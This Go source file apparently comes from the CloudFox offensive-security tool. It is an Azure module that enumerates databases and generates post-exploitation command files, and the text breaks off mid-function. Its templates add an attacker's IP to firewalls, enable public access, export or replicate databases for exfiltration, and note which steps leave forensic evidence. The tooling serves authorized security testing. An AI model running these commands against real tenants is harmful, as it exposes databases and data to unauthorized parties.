package commands

import (
	"context"
	"fmt"
	"sync"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	azinternal "github.com/BishopFox/cloudfox/internal/azure"
	"github.com/BishopFox/cloudfox/internal/azure/sdk"
	"github.com/spf13/cobra"
)

// ------------------------------
// Cobra command
// ------------------------------
var AzDatabasesCommand = &cobra.Command{
	Use:     "databases",
	Aliases: []string{"dbs"},
	Short:   "Enumerate Azure Databases (SQL, MySQL, PostgreSQL, CosmosDB)",
	Long: `
Enumerate Azure databases for a specific tenant:
./cloudfox az databases --tenant TENANT_ID

Enumerate Azure databases for a specific subscription:
./cloudfox az databases --subscription SUBSCRIPTION_ID`,
	Run: ListDatabases,
}

// ------------------------------
// Module struct (AWS pattern)
// ------------------------------
type DatabasesModule struct {
	azinternal.BaseAzureModule // Embed common fields (15 fields)

	// Module-specific fields
	Subscriptions []string
	DatabaseRows  [][]string
	LootMap       map[string]*internal.LootFile
	mu            sync.Mutex
}

// ------------------------------
// Output struct
// ------------------------------
type DatabasesOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o DatabasesOutput) TableFiles() []internal.TableFile { return o.Table }
func (o DatabasesOutput) LootFiles() []internal.LootFile   { return o.Loot }

// ------------------------------
// Cobra command entry point (thin wrapper)
// ------------------------------
func ListDatabases(cmd *cobra.Command, args []string) {
	// -------------------- Use InitializeCommandContext helper --------------------
	cmdCtx, err := azinternal.InitializeCommandContext(cmd, globals.AZ_DATABASES_MODULE_NAME)
	if err != nil {
		return // error already logged by helper
	}
	defer cmdCtx.Session.StopMonitoring()

	// -------------------- Initialize module --------------------
	module := &DatabasesModule{
		BaseAzureModule: azinternal.NewBaseAzureModule(cmdCtx, 5),
		Subscriptions:   cmdCtx.Subscriptions,
		DatabaseRows:    [][]string{},
		LootMap: map[string]*internal.LootFile{
			"database-commands":          {Name: "database-commands", Contents: ""},
			"database-strings":           {Name: "database-strings", Contents: ""},
			"database-firewall-commands": {Name: "database-firewall-commands", Contents: ""},
			"database-backup-commands":   {Name: "database-backup-commands", Contents: ""},
		},
	}

	// -------------------- Execute module --------------------
	module.PrintDatabases(cmdCtx.Ctx, cmdCtx.Logger)
}

// ------------------------------
// Main module method (AWS-style)
// ------------------------------
func (m *DatabasesModule) PrintDatabases(ctx context.Context, logger internal.Logger) {
	// Multi-tenant processing
	if m.IsMultiTenant {
		logger.InfoM(fmt.Sprintf("Multi-tenant mode: Processing %d tenants", len(m.Tenants)), globals.AZ_DATABASES_MODULE_NAME)

		// Process each tenant independently
		for _, tenantCtx := range m.Tenants {
			// Temporarily set module tenant context for row creation
			savedTenantID := m.TenantID
			savedTenantName := m.TenantName
			savedTenantInfo := m.TenantInfo

			m.TenantID = tenantCtx.TenantID
			m.TenantName = tenantCtx.TenantName
			m.TenantInfo = tenantCtx.TenantInfo

			if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
				logger.InfoM(fmt.Sprintf("Processing tenant: %s (%s)", m.TenantName, m.TenantID), globals.AZ_DATABASES_MODULE_NAME)
			}

			// Process subscriptions for this tenant
			m.RunSubscriptionEnumeration(ctx, logger, tenantCtx.Subscriptions, globals.AZ_DATABASES_MODULE_NAME, m.processSubscription)

			// Restore tenant context
			m.TenantID = savedTenantID
			m.TenantName = savedTenantName
			m.TenantInfo = savedTenantInfo
		}
	} else {
		// Single tenant processing (existing logic)
		logger.InfoM(fmt.Sprintf("Enumerating databases for %d subscription(s)", len(m.Subscriptions)), globals.AZ_DATABASES_MODULE_NAME)
		m.RunSubscriptionEnumeration(ctx, logger, m.Subscriptions, globals.AZ_DATABASES_MODULE_NAME, m.processSubscription)
	}

	// Generate firewall manipulation commands
	m.generateFirewallLoot()

	// Generate backup access commands
	m.generateBackupLoot()

	// Generate and write output
	m.writeOutput(ctx, logger)
}

// ------------------------------
// Process single subscription
// ------------------------------
func (m *DatabasesModule) processSubscription(ctx context.Context, subID string, logger internal.Logger) {
	// Get subscription name
	subName := azinternal.GetSubscriptionNameFromID(ctx, m.Session, subID)

	// Get resource groups (CACHED)
	resourceGroups := m.ResolveResourceGroups(subID)

	// Process resource groups concurrently for better performance
	var rgWg sync.WaitGroup
	rgSemaphore := make(chan struct{}, 10) // Limit to 10 concurrent RGs

	for _, rgName := range resourceGroups {
		rgWg.Add(1)
		go m.processResourceGroup(ctx, subID, subName, rgName, &rgWg, rgSemaphore)
	}

	rgWg.Wait()
}

// ------------------------------
// Process single resource group (extracted for RG-level concurrency)
// ------------------------------
func (m *DatabasesModule) processResourceGroup(ctx context.Context, subID, subName, rgName string, wg *sync.WaitGroup, semaphore chan struct{}) {
	defer wg.Done()

	// Acquire semaphore
	semaphore <- struct{}{}
	defer func() { <-semaphore }()

	// Get region
	region := ""
	rgs := sdk.CachedGetResourceGroupsPerSubscription(m.Session, subID)
	for _, r := range rgs {
		if r.Name != nil && *r.Name == rgName && r.Location != nil {
			region = *r.Location
			break
		}
	}

	// Use existing helper function - returns [][]string rows directly
	dbRows := azinternal.GetDatabasesPerResourceGroup(ctx, m.Session, subID, subName, rgName, m.LootMap, region, m.TenantName, m.TenantID)

	// Thread-safe append
	m.mu.Lock()
	m.DatabaseRows = append(m.DatabaseRows, dbRows...)
	m.mu.Unlock()
}

// ------------------------------
// Generate firewall manipulation commands
// ------------------------------
func (m *DatabasesModule) generateFirewallLoot() {
	// Track unique servers by type
	type ServerInfo struct {
		SubscriptionID   string
		SubscriptionName string
		ResourceGroup    string
		Region           string
		ServerName       string
		DBType           string
	}

	uniqueServers := make(map[string]ServerInfo)
	for _, row := range m.DatabaseRows {
		if len(row) < 7 {
			continue
		}
		subID := row[0]
		subName := row[1]
		rgName := row[2]
		region := row[3]
		serverName := row[4]
		dbType := row[6]

		// Skip if no server name or N/A
		if serverName == "" || serverName == "N/A" {
			continue
		}

		key := subID + "/" + rgName + "/" + serverName + "/" + dbType
		if _, exists := uniqueServers[key]; !exists {
			uniqueServers[key] = ServerInfo{
				SubscriptionID:   subID,
				SubscriptionName: subName,
				ResourceGroup:    rgName,
				Region:           region,
				ServerName:       serverName,
				DBType:           dbType,
			}
		}
	}

	if len(uniqueServers) == 0 {
		return
	}

	lf := m.LootMap["database-firewall-commands"]
	lf.Contents += "# ===============================================\n"
	lf.Contents += "# DATABASE FIREWALL MANIPULATION COMMANDS\n"
	lf.Contents += "# ===============================================\n"
	lf.Contents += "# WARNING: These commands modify firewall rules and are HIGHLY DETECTABLE\n"
	lf.Contents += "# - All firewall changes are logged in Azure Activity Logs\n"
	lf.Contents += "# - Consider using existing Azure services (0.0.0.0) if already enabled\n"
	lf.Contents += "# - Adding specific IPs creates forensic evidence\n"
	lf.Contents += "# ===============================================\n\n"

	for _, srv := range uniqueServers {
		switch srv.DBType {
		case "SQL Database", "SQL Managed Instance":
			lf.Contents += fmt.Sprintf(
				"## SQL Server: %s (Resource Group: %s)\n"+
					"# Set subscription context\n"+
					"az account set --subscription %s\n"+
					"\n"+
					"# List current firewall rules\n"+
					"az sql server firewall-rule list --resource-group %s --server %s --output table\n"+
					"\n"+
					"# Add attacker IP to firewall (HIGHLY DETECTABLE)\n"+
					"az sql server firewall-rule create \\\n"+
					"  --resource-group %s \\\n"+
					"  --server %s \\\n"+
					"  --name \"MaintenanceAccess\" \\\n"+
					"  --start-ip-address <YOUR-IP> \\\n"+
					"  --end-ip-address <YOUR-IP>\n"+
					"\n"+
					"# Enable Azure services access (0.0.0.0 - less suspicious if already present)\n"+
					"az sql server firewall-rule create \\\n"+
					"  --resource-group %s \\\n"+
					"  --server %s \\\n"+
					"  --name \"AllowAllWindowsAzureIps\" \\\n"+
					"  --start-ip-address 0.0.0.0 \\\n"+
					"  --end-ip-address 0.0.0.0\n"+
					"\n"+
					"# Open to entire internet (EXTREMELY DETECTABLE - NOT RECOMMENDED)\n"+
					"# az sql server firewall-rule create --resource-group %s --server %s --name \"AllowAll\" --start-ip-address 0.0.0.0 --end-ip-address 255.255.255.255\n"+
					"\n"+
					"# Delete firewall rule after access\n"+
					"az sql server firewall-rule delete --resource-group %s --server %s --name \"MaintenanceAccess\"\n"+
					"\n"+
					"## PowerShell equivalents\n"+
					"Set-AzContext -SubscriptionId %s\n"+
					"Get-AzSqlServerFirewallRule -ResourceGroupName %s -ServerName %s\n"+
					"New-AzSqlServerFirewallRule -ResourceGroupName %s -ServerName %s -FirewallRuleName \"MaintenanceAccess\" -StartIpAddress <YOUR-IP> -EndIpAddress <YOUR-IP>\n"+
					"New-AzSqlServerFirewallRule -ResourceGroupName %s -ServerName %s -FirewallRuleName \"AllowAllWindowsAzureIps\" -StartIpAddress 0.0.0.0 -EndIpAddress 0.0.0.0\n"+
					"Remove-AzSqlServerFirewallRule -ResourceGroupName %s -ServerName %s -FirewallRuleName \"MaintenanceAccess\"\n\n",
				srv.ServerName, srv.ResourceGroup,
				srv.SubscriptionID,
				srv.ResourceGroup, srv.ServerName,
				srv.ResourceGroup, srv.ServerName,
				srv.ResourceGroup, srv.ServerName,
				srv.ResourceGroup, srv.ServerName,
				srv.ResourceGroup, srv.ServerName,
				srv.SubscriptionID,
				srv.ResourceGroup, srv.ServerName,
				srv.ResourceGroup, srv.ServerName,
				srv.ResourceGroup, srv.ServerName,
				srv.ResourceGroup, srv.ServerName,
			)

		case "MySQL Single Server", "MySQL Flexible Server":
			lf.Contents += fmt.Sprintf(
				"## MySQL Server: %s (Resource Group: %s)\n"+
					"# Set subscription context\n"+
					"az account set --subscription %s\n"+
					"\n"+
					"# List current firewall rules\n"+
					"az mysql server firewall-rule list --resource-group %s --server-name %s --output table\n"+
					"\n"+
					"# Add attacker IP to firewall (HIGHLY DETECTABLE)\n"+
					"az mysql server firewall-rule create \\\n"+
					"  --resource-group %s \\\n"+
					"  --server-name %s \\\n"+
					"  --name \"MaintenanceAccess\" \\\n"+
					"  --start-ip-address <YOUR-IP> \\\n"+
					"  --end-ip-address <YOUR-IP>\n"+
					"\n"+
					"# Enable Azure services access (0.0.0.0)\n"+
					"az mysql server firewall-rule create \\\n"+
					"  --resource-group %s \\\n"+
					"  --server-name %s \\\n"+
					"  --name \"AllowAllWindowsAzureIps\" \\\n"+
					"  --start-ip-address 0.0.0.0 \\\n"+
					"  --end-ip-address 0.0.0.0\n"+
					"\n"+
					"# Delete firewall rule after access\n"+
					"az mysql server firewall-rule delete --resource-group %s --server-name %s --name \"MaintenanceAccess\"\n"+
					"\n"+
					"## PowerShell equivalents\n"+
					"Set-AzContext -SubscriptionId %s\n"+
					"Get-AzMySqlFirewallRule -ResourceGroupName %s -ServerName %s\n"+
					"New-AzMySqlFirewallRule -ResourceGroupName %s -ServerName %s -Name \"MaintenanceAccess\" -StartIPAddress <YOUR-IP> -EndIPAddress <YOUR-IP>\n"+
					"New-AzMySqlFirewallRule -ResourceGroupName %s -ServerName %s -Name \"AllowAllWindowsAzureIps\" -StartIPAddress 0.0.0.0 -EndIPAddress 0.0.0.0\n"+
					"Remove-AzMySqlFirewallRule -ResourceGroupName %s -ServerName %s -Name \"MaintenanceAccess\"\n\n",
				srv.ServerName, srv.ResourceGroup,
				srv.SubscriptionID,
				srv.ResourceGroup, srv.ServerName,
				srv.ResourceGroup, srv.ServerName,
				srv.ResourceGroup, srv.ServerName,
				srv.ResourceGroup, srv.ServerName,
				srv.SubscriptionID,
				srv.ResourceGroup, srv.ServerName,
				srv.ResourceGroup, srv.ServerName,
				srv.ResourceGroup, srv.ServerName,
				srv.ResourceGroup, srv.ServerName,
			)

		case "PostgreSQL":
			lf.Contents += fmt.Sprintf(
				"## PostgreSQL Server: %s (Resource Group: %s)\n"+
					"# Set subscription context\n"+
					"az account set --subscription %s\n"+
					"\n"+
					"# List current firewall rules\n"+
					"az postgres server firewall-rule list --resource-group %s --server-name %s --output table\n"+
					"\n"+
					"# Add attacker IP to firewall (HIGHLY DETECTABLE)\n"+
					"az postgres server firewall-rule create \\\n"+
					"  --resource-group %s \\\n"+
					"  --server-name %s \\\n"+
					"  --name \"MaintenanceAccess\" \\\n"+
					"  --start-ip-address <YOUR-IP> \\\n"+
					"  --end-ip-address <YOUR-IP>\n"+
					"\n"+
					"# Enable Azure services access (0.0.0.0)\n"+
					"az postgres server firewall-rule create \\\n"+
					"  --resource-group %s \\\n"+
					"  --server-name %s \\\n"+
					"  --name \"AllowAllWindowsAzureIps\" \\\n"+
					"  --start-ip-address 0.0.0.0 \\\n"+
					"  --end-ip-address 0.0.0.0\n"+
					"\n"+
					"# Delete firewall rule after access\n"+
					"az postgres server firewall-rule delete --resource-group %s --server-name %s --name \"MaintenanceAccess\"\n"+
					"\n"+
					"## PowerShell equivalents\n"+
					"Set-AzContext -SubscriptionId %s\n"+
					"Get-AzPostgreSqlFirewallRule -ResourceGroupName %s -ServerName %s\n"+
					"New-AzPostgreSqlFirewallRule -ResourceGroupName %s -ServerName %s -Name \"MaintenanceAccess\" -StartIPAddress <YOUR-IP> -EndIPAddress <YOUR-IP>\n"+
					"New-AzPostgreSqlFirewallRule -ResourceGroupName %s -ServerName %s -Name \"AllowAllWindowsAzureIps\" -StartIPAddress 0.0.0.0 -EndIPAddress 0.0.0.0\n"+
					"Remove-AzPostgreSqlFirewallRule -ResourceGroupName %s -ServerName %s -Name \"MaintenanceAccess\"\n\n",
				srv.ServerName, srv.ResourceGroup,
				srv.SubscriptionID,
				srv.ResourceGroup, srv.ServerName,
				srv.ResourceGroup, srv.ServerName,
				srv.ResourceGroup, srv.ServerName,
				srv.ResourceGroup, srv.ServerName,
				srv.SubscriptionID,
				srv.ResourceGroup, srv.ServerName,
				srv.ResourceGroup, srv.ServerName,
				srv.ResourceGroup, srv.ServerName,
				srv.ResourceGroup, srv.ServerName,
			)

		case "CosmosDB":
			lf.Contents += fmt.Sprintf(
				"## CosmosDB Account: %s (Resource Group: %s)\n"+
					"# Set subscription context\n"+
					"az account set --subscription %s\n"+
					"\n"+
					"# List current network rules (CosmosDB uses IP rules and virtual networks)\n"+
					"az cosmosdb show --resource-group %s --name %s --query \"{ipRules:ipRules, virtualNetworkRules:virtualNetworkRules}\" --output json\n"+
					"\n"+
					"# Add attacker IP to firewall (HIGHLY DETECTABLE)\n"+
					"az cosmosdb update \\\n"+
					"  --resource-group %s \\\n"+
					"  --name %s \\\n"+
					"  --ip-range-filter <YOUR-IP>\n"+
					"\n"+
					"# Add multiple IPs (comma-separated)\n"+
					"az cosmosdb update \\\n"+
					"  --resource-group %s \\\n"+
					"  --name %s \\\n"+
					"  --ip-range-filter \"<YOUR-IP>,<EXISTING-IP-1>,<EXISTING-IP-2>\"\n"+
					"\n"+
					"# Enable public network access if disabled\n"+
					"az cosmosdb update \\\n"+
					"  --resource-group %s \\\n"+
					"  --name %s \\\n"+
					"  --enable-public-network true\n"+
					"\n"+
					"## PowerShell equivalents\n"+
					"Set-AzContext -SubscriptionId %s\n"+
					"$cosmosDb = Get-AzCosmosDBAccount -ResourceGroupName %s -Name %s\n"+
					"$cosmosDb.IpRules\n"+
					"$cosmosDb.VirtualNetworkRules\n"+
					"# Note: Use Azure CLI for CosmosDB firewall updates - PowerShell cmdlets are limited\n\n",
				srv.ServerName, srv.ResourceGroup,
				srv.SubscriptionID,
				srv.ResourceGroup, srv.ServerName,
				srv.ResourceGroup, srv.ServerName,
				srv.ResourceGroup, srv.ServerName,
				srv.ResourceGroup, srv.ServerName,
				srv.SubscriptionID,
				srv.ResourceGroup, srv.ServerName,
			)
		}
	}
}

// ------------------------------
// Generate database backup access commands
// ------------------------------
func (m *DatabasesModule) generateBackupLoot() {
	// Track unique databases by type
	type DatabaseInfo struct {
		SubscriptionID   string
		SubscriptionName string
		ResourceGroup    string
		Region           string
		ServerName       string
		DatabaseName     string
		DBType           string
	}

	uniqueDatabases := make(map[string]DatabaseInfo)
	for _, row := range m.DatabaseRows {
		if len(row) < 7 {
			continue
		}
		subID := row[0]
		subName := row[1]
		rgName := row[2]
		region := row[3]
		serverName := row[4]
		dbName := row[5]
		dbType := row[6]

		// Skip if no database name or N/A
		if dbName == "" || dbName == "N/A" {
			continue
		}

		key := subID + "/" + rgName + "/" + serverName + "/" + dbName + "/" + dbType
		if _, exists := uniqueDatabases[key]; !exists {
			uniqueDatabases[key] = DatabaseInfo{
				SubscriptionID:   subID,
				SubscriptionName: subName,
				ResourceGroup:    rgName,
				Region:           region,
				ServerName:       serverName,
				DatabaseName:     dbName,
				DBType:           dbType,
			}
		}
	}

	if len(uniqueDatabases) == 0 {
		return
	}

	lf := m.LootMap["database-backup-commands"]
	lf.Contents += "# ===============================================\n"
	lf.Contents += "# DATABASE BACKUP ACCESS COMMANDS\n"
	lf.Contents += "# ===============================================\n"
	lf.Contents += "# Database backups often contain:\n"
	lf.Contents += "# - Complete copy of production data\n"
	lf.Contents += "# - Historical data that may have been deleted\n"
	lf.Contents += "# - Schema and stored procedures\n"
	lf.Contents += "# - User accounts and permissions\n"
	lf.Contents += "# ===============================================\n\n"

	for _, db := range uniqueDatabases {
		switch db.DBType {
		case "SQL Database":
			lf.Contents += fmt.Sprintf(
				"## SQL Database: %s/%s (Resource Group: %s)\n"+
					"# Set subscription context\n"+
					"az account set --subscription %s\n"+
					"\n"+
					"# List all available backups (automatic backups)\n"+
					"az sql db list-backups \\\n"+
					"  --resource-group %s \\\n"+
					"  --server %s \\\n"+
					"  --name %s \\\n"+
					"  --output table\n"+
					"\n"+
					"# List long-term retention backups\n"+
					"az sql db ltr-backup list \\\n"+
					"  --location %s \\\n"+
					"  --server %s \\\n"+
					"  --database %s \\\n"+
					"  --output table\n"+
					"\n"+
					"# Export database to storage account (requires admin credentials)\n"+
					"az sql db export \\\n"+
					"  --resource-group %s \\\n"+
					"  --server %s \\\n"+
					"  --name %s \\\n"+
					"  --admin-user <ADMIN-USERNAME> \\\n"+
					"  --admin-password <ADMIN-PASSWORD> \\\n"+
					"  --storage-key <STORAGE-KEY> \\\n"+
					"  --storage-key-type StorageAccessKey \\\n"+
					"  --storage-uri https://<storage-account>.blob.core.windows.net/<container>/%s.bacpac\n"+
					"\n"+
					"# Restore database from backup to new instance\n"+
					"az sql db restore \\\n"+
					"  --resource-group %s \\\n"+
					"  --server %s \\\n"+
					"  --name %s-restored \\\n"+
					"  --dest-name %s-restored \\\n"+
					"  --time \"<YYYY-MM-DDTHH:MM:SS>\"\n"+
					"\n"+
					"# Copy database to another server (creates backup)\n"+
					"az sql db copy \\\n"+
					"  --resource-group %s \\\n"+
					"  --server %s \\\n"+
					"  --name %s \\\n"+
					"  --dest-resource-group <DEST-RG> \\\n"+
					"  --dest-server <DEST-SERVER> \\\n"+
					"  --dest-name %s-copy\n"+
					"\n"+
					"## PowerShell equivalents\n"+
					"Set-AzContext -SubscriptionId %s\n"+
					"\n"+
					"# List backups\n"+
					"Get-AzSqlDatabaseBackup -ResourceGroupName %s -ServerName %s -DatabaseName %s\n"+
					"\n"+
					"# Export database\n"+
					"$exportRequest = New-AzSqlDatabaseExport `\n"+
					"  -ResourceGroupName %s `\n"+
					"  -ServerName %s `\n"+
					"  -DatabaseName %s `\n"+
					"  -StorageKeyType StorageAccessKey `\n"+
					"  -StorageKey <STORAGE-KEY> `\n"+
					"  -StorageUri https://<storage-account>.blob.core.windows.net/<container>/%s.bacpac `\n"+
					"  -AdministratorLogin <ADMIN-USERNAME> `\n"+
					"  -AdministratorLoginPassword (ConvertTo-SecureString -String \"<ADMIN-PASSWORD>\" -AsPlainText -Force)\n"+
					"\n"+
					"# Check export status\n"+
					"Get-AzSqlDatabaseImportExportStatus -OperationStatusLink $exportRequest.OperationStatusLink\n"+
					"\n"+
					"# Restore from point in time\n"+
					"Restore-AzSqlDatabase `\n"+
					"  -ResourceGroupName %s `\n"+
					"  -ServerName %s `\n"+
					"  -TargetDatabaseName %s-restored `\n"+
					"  -ResourceId /subscriptions/%s/resourceGroups/%s/providers/Microsoft.Sql/servers/%s/databases/%s `\n"+
					"  -PointInTime \"<YYYY-MM-DDTHH:MM:SS>\"\n\n",
				db.ServerName, db.DatabaseName, db.ResourceGroup,
				db.SubscriptionID,
				db.ResourceGroup, db.ServerName, db.DatabaseName,
				db.Region, db.ServerName, db.DatabaseName,
				db.ResourceGroup, db.ServerName, db.DatabaseName, db.DatabaseName,
				db.ResourceGroup, db.ServerName, db.DatabaseName, db.DatabaseName,
				db.ResourceGroup, db.ServerName, db.DatabaseName, db.DatabaseName,
				db.SubscriptionID,
				db.ResourceGroup, db.ServerName, db.DatabaseName,
				db.ResourceGroup, db.ServerName, db.DatabaseName, db.DatabaseName,
				db.ResourceGroup, db.ServerName, db.DatabaseName, db.SubscriptionID, db.ResourceGroup, db.ServerName, db.DatabaseName,
			)

		case "SQL Managed Instance":
			lf.Contents += fmt.Sprintf(
				"## SQL Managed Instance Database: %s/%s (Resource Group: %s)\n"+
					"# Set subscription context\n"+
					"az account set --subscription %s\n"+
					"\n"+
					"# Managed Instance backup is automated - list available restore points\n"+
					"# NOTE: Managed Instance uses continuous backup, not discrete backup files\n"+
					"\n"+
					"# Get managed instance properties (includes earliest restore date)\n"+
					"az sql mi show \\\n"+
					"  --resource-group %s \\\n"+
					"  --name %s \\\n"+
					"  --query \"{earliestRestorePoint:earliestRestorePoint}\" \\\n"+
					"  --output table\n"+
					"\n"+
					"# Restore database to same instance (point-in-time restore)\n"+
					"az sql midb restore \\\n"+
					"  --resource-group %s \\\n"+
					"  --managed-instance %s \\\n"+
					"  --name %s \\\n"+
					"  --dest-name %s-restored \\\n"+
					"  --time \"<YYYY-MM-DDTHH:MM:SS>\"\n"+
					"\n"+
					"# Copy database to another managed instance\n"+
					"# Note: Use Azure Portal or PowerShell for cross-instance copy\n"+
					"\n"+
					"# Long-term retention backup (if enabled)\n"+
					"az sql midb ltr-backup list \\\n"+
					"  --location %s \\\n"+
					"  --managed-instance %s \\\n"+
					"  --database %s \\\n"+
					"  --output table\n"+
					"\n"+
					"## PowerShell equivalents\n"+
					"Set-AzContext -SubscriptionId %s\n"+
					"\n"+
					"# Get managed instance properties\n"+
					"Get-AzSqlInstance -ResourceGroupName %s -Name %s\n"+
					"\n"+
					"# Restore managed database\n"+
					"Restore-AzSqlInstanceDatabase `\n"+
					"  -ResourceGroupName %s `\n"+
					"  -InstanceName %s `\n"+
					"  -Name %s `\n"+
					"  -PointInTime \"<YYYY-MM-DDTHH:MM:SS>\" `\n"+
					"  -TargetInstanceDatabaseName %s-restored\n"+
					"\n"+
					"# Get long-term retention backups\n"+
					"Get-AzSqlInstanceDatabaseLongTermRetentionBackup `\n"+
					"  -Location %s `\n"+
					"  -InstanceName %s `\n"+
					"  -DatabaseName %s\n\n",
				db.ServerName, db.DatabaseName, db.ResourceGroup,
				db.SubscriptionID,
				db.ResourceGroup, db.ServerName,
				db.ResourceGroup, db.ServerName, db.DatabaseName, db.DatabaseName,
				db.Region, db.ServerName, db.DatabaseName,
				db.SubscriptionID,
				db.ResourceGroup, db.ServerName,
				db.ResourceGroup, db.ServerName, db.DatabaseName, db.DatabaseName,
				db.Region, db.ServerName, db.DatabaseName,
			)

		case "MySQL Single Server":
			lf.Contents += fmt.Sprintf(
				"## MySQL Single Server Database: %s/%s (Resource Group: %s)\n"+
					"# Set subscription context\n"+
					"az account set --subscription %s\n"+
					"\n"+
					"# List server backups (automatic backups)\n"+
					"az mysql server show \\\n"+
					"  --resource-group %s \\\n"+
					"  --name %s \\\n"+
					"  --query \"{earliestRestoreDate:earliestRestoreDate, backupRetentionDays:backupRetentionDays}\" \\\n"+
					"  --output table\n"+
					"\n"+
					"# Restore database to new server from backup\n"+
					"az mysql server restore \\\n"+
					"  --resource-group %s \\\n"+
					"  --name %s-restored \\\n"+
					"  --source-server %s \\\n"+
					"  --restore-point-in-time \"<YYYY-MM-DDTHH:MM:SS>\"\n"+
					"\n"+
					"# Create replica (can be used for data exfiltration)\n"+
					"az mysql server replica create \\\n"+
					"  --resource-group %s \\\n"+
					"  --name %s-replica \\\n"+
					"  --source-server %s\n"+
					"\n"+
					"## PowerShell equivalents\n"+
					"Set-AzContext -SubscriptionId %s\n"+
					"\n"+
					"# Get server (includes backup retention info)\n"+
					"Get-AzMySqlServer -ResourceGroupName %s -Name %s | Select-Object EarliestRestoreDate, BackupRetentionDay\n"+
					"\n"+
					"# Restore server\n"+
					"Restore-AzMySqlServer `\n"+
					"  -ResourceGroupName %s `\n"+
					"  -Name %s-restored `\n"+
					"  -SourceServerName %s `\n"+
					"  -RestorePointInTime \"<YYYY-MM-DDTHH:MM:SS>\" `\n"+
					"  -UsePointInTimeRestore\n"+
					"\n"+
					"# Create replica\n"+
					"New-AzMySqlReplica -Name %s-replica -ResourceGroupName %s -SourceServerName %s\n\n",
				db.ServerName, db.DatabaseName, db.ResourceGroup,
				db.SubscriptionID,
				db.ResourceGroup, db.ServerName,
				db.ResourceGroup, db.ServerName, db.ServerName,
				db.ResourceGroup, db.ServerName, db.ServerName,
				db.SubscriptionID,
				db.ResourceGroup, db.ServerName,
				db.ResourceGroup, db.ServerName, db.ServerName,
				db.ServerName, db.ResourceGroup, db.ServerName,
			)

		case "MySQL Flexible Server":
			lf.Contents += fmt.Sprintf(
				"## MySQL Flexible Server Database: %s/%s (Resource Group: %s)\n"+
					"# Set subscription context\n"+
					"az account set --subscription %s\n"+
					"\n"+
					"# MySQL Flexible Server uses automated backups\n"+
					"# Get server properties (includes earliest restore point)\n"+
					"az mysql flexible-server show \\\n"+
					"  --resource-group %s \\\n"+
					"  --name %s \\\n"+
					"  --query \"{backupRetentionDays:backup.backupRetentionDays, geoRedundantBackup:backup.geoRedundantBackup, earliestRestoreDate:backup.earliestRestoreDate}\" \\\n"+
					"  --output table\n"+
					"\n"+
					"# Restore database to new flexible server from backup (point-in-time)\n"+
					"az mysql flexible-server restore \\\n"+
					"  --resource-group %s \\\n"+
					"  --name %s-restored \\\n"+
					"  --source-server %s \\\n"+
					"  --restore-time \"<YYYY-MM-DDTHH:MM:SS>\"\n"+
					"\n"+
					"# Create read replica (can be used for data exfiltration)\n"+
					"az mysql flexible-server replica create \\\n"+
					"  --replica-name %s-replica \\\n"+
					"  --resource-group %s \\\n"+
					"  --source-server %s\n"+
					"\n"+
					"## PowerShell equivalents\n"+
					"Set-AzContext -SubscriptionId %s\n"+
					"\n"+
					"# Get flexible server (includes backup info)\n"+
					"Get-AzMySqlFlexibleServer -ResourceGroupName %s -Name %s | Select-Object BackupRetentionDay, GeoRedundantBackup\n"+
					"\n"+
					"# Restore flexible server\n"+
					"Restore-AzMySqlFlexibleServer `\n"+
					"  -ResourceGroupName %s `\n"+
					"  -Name %s-restored `\n"+
					"  -SourceServerResourceId /subscriptions/%s/resourceGroups/%s/providers/Microsoft.DBforMySQL/flexibleServers/%s `\n"+
					"  -RestorePointInTime \"<YYYY-MM-DDTHH:MM:SS>\"\n"+
					"\n"+
					"# Create read replica\n"+
					"New-AzMySqlFlexibleServerReplica `\n"+
					"  -Replica %s-replica `\n"+
					"  -ResourceGroupName %s `\n"+
					"  -SourceServerResourceId /subscriptions/%s/resourceGroups/%s/providers/Microsoft.DBforMySQL/flexibleServers/%s\n\n",
				db.ServerName, db.DatabaseName, db.ResourceGroup,
				db.SubscriptionID,
				db.ResourceGroup, db.ServerName,
				db.ResourceGroup, db.ServerName, db.ServerName,
				db.ServerName, db.ResourceGroup, db.ServerName,
				db.SubscriptionID,
				db.ResourceGroup, db.ServerName,
				db.ResourceGroup, db.ServerName, db.SubscriptionID, db.ResourceGroup, db.ServerName,
				db.ServerName, db.ResourceGroup, db.SubscriptionID, db.ResourceGroup, db.ServerName,
			)

		case "PostgreSQL Single Server":
			lf.Contents += fmt.Sprintf(
				"## PostgreSQL Single Server Database: %s/%s (Resource Group: %s)\n"+
					"# Set subscription context\n"+
					"az account set --subscription %s\n"+
					"\n"+
					"# List server backups (automatic backups)\n"+
					"az postgres server show \\\n"+
					"  --resource-group %s \\\n"+
					"  --name %s \\\n"+
					"  --query \"{earliestRestoreDate:earliestRestoreDate, backupRetentionDays:backupRetentionDays}\" \\\n"+
					"  --output table\n"+
					"\n"+
					"# Restore database to new server from backup\n"+
					"az postgres server restore \\\n"+
					"  --resource-group %s \\\n"+
					"  --name %s-restored \\\n"+
					"  --source-server %s \\\n"+
					"  --restore-point-in-time \"<YYYY-MM-DDTHH:MM:SS>\"\n"+
					"\n"+
					"# Create replica (can be used for data exfiltration)\n"+
					"az postgres server replica create \\\n"+
					"  --resource-group %s \\\n"+
					"  --name %s-replica \\\n"+
					"  --source-server %s\n"+
					"\n"+
					"## PowerShell equivalents\n"+
					"Set-AzContext -SubscriptionId %s\n"+
					"\n"+
					"# Get server (includes backup retention info)\n"+
					"Get-AzPostgreSqlServer -ResourceGroupName %s -Name %s | Select-Object EarliestRestoreDate, BackupRetentionDay\n"+
					"\n"+
					"# Restore server\n"+
					"Restore-AzPostgreSqlServer `\n"+
					"  -ResourceGroupName %s `\n"+
					"  -Name %s-restored `\n"+
					"  -SourceServerName %s `\n"+
					"  -RestorePointInTime \"<YYYY-MM-DDTHH:MM:SS>\" `\n"+
					"  -UsePointInTimeRestore\n"+
					"\n"+
					"# Create replica\n"+
					"New-AzPostgreSqlReplica -Name %s-replica -ResourceGroupName %s -SourceServerName %s\n\n",
				db.ServerName, db.DatabaseName, db.ResourceGroup,
				db.SubscriptionID,
				db.ResourceGroup, db.ServerName,
				db.ResourceGroup, db.ServerName, db.ServerName,
				db.ResourceGroup, db.ServerName, db.ServerName,
				db.SubscriptionID,
				db.ResourceGroup, db.ServerName,
				db.ResourceGroup, db.ServerName, db.ServerName,
				db.ServerName, db.ResourceGroup, db.ServerName,
			)

		case "PostgreSQL Flexible Server":
			lf.Contents += fmt.Sprintf(
